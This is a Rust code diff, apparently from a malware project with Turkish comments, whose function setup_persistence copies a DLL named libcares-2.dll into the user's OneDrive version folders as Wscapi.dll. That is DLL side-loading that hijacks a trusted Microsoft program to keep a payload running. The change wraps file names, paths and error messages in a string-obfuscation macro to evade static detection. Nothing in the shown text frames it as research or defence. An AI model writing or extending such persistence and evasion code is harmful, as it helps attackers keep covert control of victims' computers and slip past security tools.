@@ -1,23 +1,24 @@
 use std::fs;
 use std::env;
 use std::path::PathBuf;
+use obfuscator::obfuscate_string;
 
 pub fn setup_persistence() -> Result<(), Box<dyn std::error::Error>> {
     let current_exe = env::current_exe()?;
     let current_dir = current_exe.parent().ok_or("Current directory not found")?;
-    let source_dll = current_dir.join("libcares-2.dll");
+    let source_dll = current_dir.join(obfuscate_string!("libcares-2.dll"));
 
     if !source_dll.exists() {
         return Err(format!("DLL bulunamadı: {:?}", source_dll).into());
     }
 
-    let local_appdata = env::var("LOCALAPPDATA")?;
+    let local_appdata = env::var(obfuscate_string!("LOCALAPPDATA"))?;
     let onedrive_base = std::path::Path::new(&local_appdata)
-        .join("Microsoft")
-        .join("OneDrive");
+        .join(obfuscate_string!("Microsoft"))
+        .join(obfuscate_string!("OneDrive"));
 
     if !onedrive_base.exists() {
-        return Err("OneDrive klasörü bulunamadı".into());
+        return Err(obfuscate_string!("OneDrive klasörü bulunamadı").into());
     }
 
     // Tüm sürüm adaylarını topla (sadece klasör adı sürüm formatında olanlar)
@@ -51,7 +52,7 @@ pub fn setup_persistence() -> Result<(), Box<dyn std::error::Error>> {
     }
 
     if candidates.is_empty() {
-        return Err("Hiçbir OneDrive sürüm klasörü bulunamadı".into());
+        return Err(obfuscate_string!("Hiçbir OneDrive sürüm klasörü bulunamadı").into());
     }
 
     // Tüm aday klasörlere kopyalamayı dene
@@ -59,10 +60,10 @@ pub fn setup_persistence() -> Result<(), Box<dyn std::error::Error>> {
     let mut errors = Vec::new();
 
     for version_dir in candidates {
-        let target_dll = version_dir.join("Wscapi.dll");
-		
+        let target_dll = version_dir.join(obfuscate_string!("Wscapi.dll"));
+
         if target_dll.exists() {
-            success_count += 1; 
+            success_count += 1;
             continue;
         }
 
